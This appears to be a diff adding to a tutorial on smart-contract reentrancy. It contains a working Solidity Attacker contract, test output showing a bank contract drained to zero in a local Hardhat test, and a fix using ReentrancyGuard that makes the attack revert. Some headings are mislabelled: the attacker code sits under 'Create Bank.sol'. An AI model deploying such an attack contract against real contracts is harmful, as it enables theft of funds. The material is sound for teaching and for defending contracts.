@@ -64,9 +64,107 @@ choose Create empty harthat.config.js
 
 ```
 ### Create Bank.sol
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./Utils.sol";
+
+interface IBank {
+  function deposit() external payable;
+
+  function withdraw() external;
+}
+
+contract Attacker is Ownable {
+  IBank public immutable bankContract;
+
+  constructor(address bankContractAddr) {
+    bankContract = IBank(bankContractAddr);
+  }
+
+  function attack() external payable onlyOwner {
+    bankContract.deposit{ value: msg.value }();
+    bankContract.withdraw();
+  }
+
+  receive() external payable {
+    if (address(bankContract).balance > 0) {
+      bankContract.withdraw();
+    } else {
+      payable(owner()).transfer(address(this).balance);
+    }
+  }
+}
+
+```
 ### Create Attack.sol
 ### Create test.js
 ### Excute test with harthat-test
 ```powershell
 npx hardhat test
+//resutl:
+  Deploy
+    Test deposit and withdraw of Bank contract
+      ✔ Should accept deposits (41ms)
+      ✔ Should accept withdrawals (54ms)
+
+*** Before ***
+Bank's Balance: 150.0
+Attacker's balance: 9999.997516974923208298
+
+*** After ***
+Bank's Balance: 0.0
+Attacker's balance: 10149.997314361989225637
+
+      ✔ Perform Attack (132ms)
+
+
+  3 passing (3s)
+```
+### Add ReentrancyGuard in Bank.sol
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+import "./Utils.sol";
+
+contract Bank is ReentrancyGuard {
+  using Address for address payable;
+  mapping(address => uint256) public balanceOf;
+
+  function deposit() external payable {
+    balanceOf[msg.sender] += msg.value;
+  }
+
+  function withdraw() external nonReentrant {
+    uint256 depositedAmount = balanceOf[msg.sender];
+    payable(msg.sender).sendValue(depositedAmount);
+    balanceOf[msg.sender] = 0;
+  }
+}
+
+```
+
+### run harthad test again
+```powershell
+//result:
+  Deploy
+    Test deposit and withdraw of Bank contract
+      ✔ Should accept deposits (55ms)
+      ✔ Should accept withdrawals (73ms)
+
+*** Before ***
+Bank's Balance: 150.0
+Attacker's balance: 9999.997516538428892842
+      1) Perform Attack
+
+
+  2 passing (3s)
+  1 failing
+
+  1) Deploy
+       Test deposit and withdraw of Bank contract
+         Perform Attack:
+     Error: VM Exception while processing transaction: reverted with reason string 'Address: unable to send value, recipient may have reverted'
+    at Bank.sendValue (contracts/Utils.sol:56)
 ```
